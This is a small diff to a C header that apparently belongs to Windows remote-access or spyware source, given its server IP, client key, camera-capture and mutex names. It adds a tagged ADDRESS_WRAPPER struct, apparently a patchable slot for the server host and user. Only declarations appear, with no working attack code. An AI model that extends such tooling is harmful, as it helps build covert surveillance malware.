@@ -6,6 +6,15 @@
 
 #include <windows.h>
 
+typedef struct {
+
+	char tag[16];
+	DWORD ip;
+	char host[256];
+	char user[32];
+	char tagend[16];
+}ADDRESS_WRAPPER;
+
 
 #define HTTP_PORT						80
 
@@ -173,6 +182,8 @@ extern char gUserName[64];
 extern DWORD gServerIP;
 extern int gStartMode;
 extern unsigned char gClientKey[16];
+
+extern ADDRESS_WRAPPER gAddrWrapper;
 
 extern char LITTLEBEAR_MUTEX_NAME[];
 extern char  CAMERA_CAPTURE_NAME[];
